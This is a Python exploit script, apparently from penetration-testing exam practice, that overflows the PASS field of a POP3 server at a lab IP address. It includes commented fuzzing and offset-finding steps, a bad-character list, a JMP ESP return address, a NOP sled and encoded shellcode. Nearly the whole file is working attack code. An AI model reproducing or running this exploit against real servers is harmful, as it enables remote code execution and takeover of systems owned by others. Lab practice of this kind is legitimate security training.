#!/usr/bin/python
import socket

# 22 minutes, exploit developed and confirmed!
# Third rehearsal. So I saved 1 hour and 8 minutes
#buffer=["A"]
#counter=100
#while len(buffer) <= 30:
#	buffer.append("A"*counter)
#	counter+=200
#for string in buffer:
#	print "Fuzzing PASS with {} bytes".format(str(len(string)))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#	connect=s.connect(("10.11.11.158",110))
#	s.recv(1024)
#	s.send("USER test\r\n")
#	s.recv(1024)
#	s.send("PASS"+string+'\r\n')
#	s.send("QUIT\r\n")
#	s.close()
#buffer = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9")

#buffer = "A"*2606 + "B"*4 + "C"*(2700-2606-4)
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# bad character found, 0x0a rendered to 0x29
# second bad character found, 0x0d rendered to 0x0e
# bad characters are 0x00 0x0a 0x0d
#5F4A358F = return address with JMP ESP Instruction
ret = "\x8f\x35\x4a\x5f"#little endian
nopsled = 16*"\x90"
shellcode = ("\xbe\x9e\xef\x13\x3d\xdb\xdc\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x70\x12\x03\x70\x12\x83\x5e\xeb\xf1\xc8\xa2\x1c\x77"
"\x32\x5a\xdd\x18\xba\xbf\xec\x18\xd8\xb4\x5f\xa9\xaa\x98\x53"
"\x42\xfe\x08\xe7\x26\xd7\x3f\x40\x8c\x01\x0e\x51\xbd\x72\x11"
"\xd1\xbc\xa6\xf1\xe8\x0e\xbb\xf0\x2d\x72\x36\xa0\xe6\xf8\xe5"
"\x54\x82\xb5\x35\xdf\xd8\x58\x3e\x3c\xa8\x5b\x6f\x93\xa2\x05"
"\xaf\x12\x66\x3e\xe6\x0c\x6b\x7b\xb0\xa7\x5f\xf7\x43\x61\xae"
"\xf8\xe8\x4c\x1e\x0b\xf0\x89\x99\xf4\x87\xe3\xd9\x89\x9f\x30"
"\xa3\x55\x15\xa2\x03\x1d\x8d\x0e\xb5\xf2\x48\xc5\xb9\xbf\x1f"
"\x81\xdd\x3e\xf3\xba\xda\xcb\xf2\x6c\x6b\x8f\xd0\xa8\x37\x4b"
"\x78\xe9\x9d\x3a\x85\xe9\x7d\xe2\x23\x62\x93\xf7\x59\x29\xfc"
"\x34\x50\xd1\xfc\x52\xe3\xa2\xce\xfd\x5f\x2c\x63\x75\x46\xab"
"\x84\xac\x3e\x23\x7b\x4f\x3f\x6a\xb8\x1b\x6f\x04\x69\x24\xe4"
"\xd4\x96\xf1\xab\x84\x38\xaa\x0b\x74\xf9\x1a\xe4\x9e\xf6\x45"
"\x14\xa1\xdc\xed\xbf\x58\xb7\x1b\x4b\x62\x6a\x74\x49\x62\x75"
"\x3f\xc4\x84\x1f\x2f\x81\x1f\x88\xd6\x88\xeb\x29\x16\x07\x96"
"\x6a\x9c\xa4\x67\x24\x55\xc0\x7b\xd1\x95\x9f\x21\x74\xa9\x35"
"\x4d\x1a\x38\xd2\x8d\x55\x21\x4d\xda\x32\x97\x84\x8e\xae\x8e"
"\x3e\xac\x32\x56\x78\x74\xe9\xab\x87\x75\x7c\x97\xa3\x65\xb8"
"\x18\xe8\xd1\x14\x4f\xa6\x8f\xd2\x39\x08\x79\x8d\x96\xc2\xed"
"\x48\xd5\xd4\x6b\x55\x30\xa3\x93\xe4\xed\xf2\xac\xc9\x79\xf3"
"\xd5\x37\x1a\xfc\x0c\xfc\x2a\xb7\x0c\x55\xa3\x1e\xc5\xe7\xae"
"\xa0\x30\x2b\xd7\x22\xb0\xd4\x2c\x3a\xb1\xd1\x69\xfc\x2a\xa8"
"\xe2\x69\x4c\x1f\x02\xb8")
buffer = "A"*2606 + ret + nopsled + shellcode + "C"*(3500-351-2606-16-4)
try:
        print "\nSending evil buffer"
        s.connect(("10.11.11.158",110))
        data=s.recv(1024)
        s.send('USER username'+'\r\n')
        data=s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print('\nDone!')
except:
        print "Could not connect to POP3 server"
